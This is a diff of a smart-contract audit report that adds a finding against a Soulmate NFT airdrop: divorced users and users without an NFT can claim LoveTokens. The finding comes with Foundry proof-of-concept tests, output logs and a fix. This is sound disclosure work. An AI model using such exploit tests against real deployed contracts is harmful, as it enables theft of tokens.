@@ -59,7 +59,7 @@ instead of the user's address. A divorced user can still claim a Soulbound NFT.
 First, the `Airdrop::isDivorced` check send a contract address instead of users address to the function and it will always returns false and the check will fail
 
 ```solidity
- if (soulmateContract.isDivorced()) revert Airdrop__CoupleIsDivorced();
+ @> if (soulmateContract.isDivorced()) revert Airdrop__CoupleIsDivorced();
 
 ```
 
@@ -69,9 +69,100 @@ function isDivorced() public view returns (bool) {
     }
 ```
 
-**Impact:**
+Second, `numberOfDaysInCouple` is computed using the timestamp when the NFT was minted, but for the attacker without a minted NFT, it returns the timestamp of the first minted NFT.
+
+```solidity
+@> uint256 numberOfDaysInCouple = (block.timestamp -
+            soulmateContract.idToCreationTimestamp(
+                soulmateContract.ownerToId(msg.sender)
+            )) / daysInSecond;
+```
+
+
+
+**Impact:** LoveTokens can be claimed by users for which they are not intended for.
+
+
 **Proof Of Concept:**
+
+#### Users who are not having the Soulmate NFT can also claim the Airdrop
+
+```solidity
+ function test_NonSoulmateOwnerCanClaimAsWell() public{
+        address attacker  = makeAddr("attacker");
+        console.log("Attacker Balance before claiming the tokens: ", loveToken.balanceOf(attacker)/10**loveToken.decimals());
+        vm.prank(attacker);
+        vm.warp(2 weeks);
+        airdropContract.claim();
+        console.log("Attacker Balance before after the tokens: ", loveToken.balanceOf(attacker)/10**loveToken.decimals());
+}
+```
+
+```solidity
+Output:>
+Logs:
+  Attacker Balance before claiming the tokens:  0
+  Attacker Balance before after the tokens:  14
+```
+
+
+#### Divorced User's claiming the tokens
+```solidity
+function test_divorcedUsersCanAlsoClaimloveTokens() public{
+        vm.prank(soulmate1);
+        soulmateContract.mintSoulmateToken();
+        vm.prank(soulmate2);
+        soulmateContract.mintSoulmateToken();
+        vm.warp(1 weeks);
+        //Getting a divorce
+        vm.prank(soulmate1);
+        soulmateContract.getDivorced();
+
+        // User was able to claim airdrop even after being divorced.
+        vm.prank(soulmate1);
+        airdropContract.claim();
+        assert(loveToken.balanceOf(soulmate1)>0);
+        
+        // User was able to claim airdrop even after being divorced.
+        vm.prank(soulmate2);
+        airdropContract.claim();
+        assert(loveToken.balanceOf(soulmate2)>0);
+    }
+```
 **Recommended Mitigation**
+
+You can add the following changes to mitigate the issue:
+
+```solidity
+	function claim() public {
+        // No LoveToken for people who don't love their soulmates anymore.
+-		if (soulmateContract.isDivorced()) revert Airdrop__CoupleIsDivorced();
++		if (soulmateContract.isDivorced(msg.sender)) revert Airdrop__CoupleIsDivorced();
+
++      require(soulmateContract.ownerToId(msg.sender) != 0);
+
+        // Calculating since how long soulmates are reunited
+        uint256 numberOfDaysInCouple = (block.timestamp -
+            soulmateContract.idToCreationTimestamp(
+                soulmateContract.ownerToId(msg.sender)
+            )) / daysInSecond;
+
+	}
+```
+
+Also update the function 
+
+```soildity
+-  function isDivorced() public view returns (bool) {        
+-      return divorced[msg.sender];
+-  }
+    
++  function isDivorced(address soulmate) public view returns (bool) {        
++      return divorced[soulmate];
++  }
+
+```
+
 
 ### [H-3]
 
@@ -79,13 +170,6 @@ function isDivorced() public view returns (bool) {
 **Impact:**
 **Proof Of Concept:**
 **Recommended Mitigation**
-
-### [H-4]
-**Decription:**
-**Impact:**
-**Proof Of Concept:**
-**Recommended Mitigation**
-
 
 # Medium
 
